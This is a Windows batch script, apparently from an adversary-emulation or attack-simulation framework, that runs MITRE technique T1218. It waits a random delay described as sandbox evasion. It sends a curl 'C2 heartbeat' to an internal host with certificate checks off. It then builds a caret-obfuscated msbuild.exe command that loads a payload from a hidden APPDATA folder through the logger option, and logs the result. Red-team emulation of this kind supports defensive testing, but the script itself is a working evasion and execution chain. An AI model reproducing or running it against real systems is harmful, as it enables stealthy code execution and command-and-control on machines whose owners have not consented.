@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random variable names for PHR_ placeholders
SET kxtpgns=%APPDATA%\8803\a1bc4a9f
SET zkxuwf=https://10.0.0.49
SET vfqgbtj=https://10.0.0.49/stage/2/icon.png?8803-10
SET svlkdy=ITZEL-S2BO
SET rbvnjy=10
SET rkjflwh=onenote.txt
SET pcvfbde=8803

REM Log file path
SET gcxwaq=%APPDATA%\!rbvnjy!\macula-simulations.log
SET hqswp=1
SET uiqfwp=

REM Initial sandbox delay (random 30-60s)
SET /A imhnlk=%RANDOM% %% 31 + 30
echo [!DATE! !TIME!][DEBUG][!svlkdy!]: initial_delay=!imhnlk!s>> "!gcxwaq!" 2>nul
timeout /t !imhnlk! /nobreak >nul

REM C2 Heartbeat (MUST be first operation)
echo [!DATE! !TIME!][DEBUG][!svlkdy!]: heartbeat_start=!vfqgbtj!>> "!gcxwaq!" 2>nul
curl -k -s -o nul "!vfqgbtj!"
echo [!DATE! !TIME!][DEBUG][!svlkdy!]: heartbeat_complete=success>> "!gcxwaq!" 2>nul
ping -n 12 127.0.0.1 >nul

REM Build escaped LOLBIN command fragments
SET nvbgtp=%SystemRoot%\M^i^c^r^o^s^o^f^t^.N^E^T\F^r^a^m^e^w^o^r^k\v^4^.0^.3^0^3^1^9\
SET ycpqhw=m^s^b^u^i^l^d^.e^x^e
SET lkzdmv= /l^o^g^g^e^r:^L^o^g^g^e^r^E^n^t^r^y,
SET zqmxfl=;^M^y^P^a^r^a^m^e^t^e^r^s,^F^o^o

REM Construct escaped command
SET jqxkz=!nvbgtp!!ycpqhw!!lkzdmv!!kxtpgns!\!rkjflwh!!zqmxfl!

REM Execute T1218: Signed Binary Proxy Execution
echo [!DATE! !TIME!][DEBUG][!svlkdy!]: t1218_execution_start=msbuild>> "!gcxwaq!" 2>nul
CALL !jqxkz!
IF !ERRORLEVEL! EQU 0 (
    SET hqswp=1
) ELSE (
    SET hqswp=0
    SET uiqfwp=execution_failed_!ERRORLEVEL!
)

REM TTP logging
SET gbrkjs=!rbvnjy!-!pcvfbde!-T1218|Signed Binary Proxy Execution
echo [!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2! !TIME!][!svlkdy!]: !gbrkjs!=!hqswp!:!uiqfwp!>> "!gcxwaq!" 2>nul
echo [!DATE! !TIME!][DEBUG][!svlkdy!]: t1218_execution_result=!hqswp!>> "!gcxwaq!" 2>nul

REM Final random delay
SET /A ftvqjc=%RANDOM% %% 20 + 10
CHOICE /C Y /N /D Y /T !ftvqjc! >nul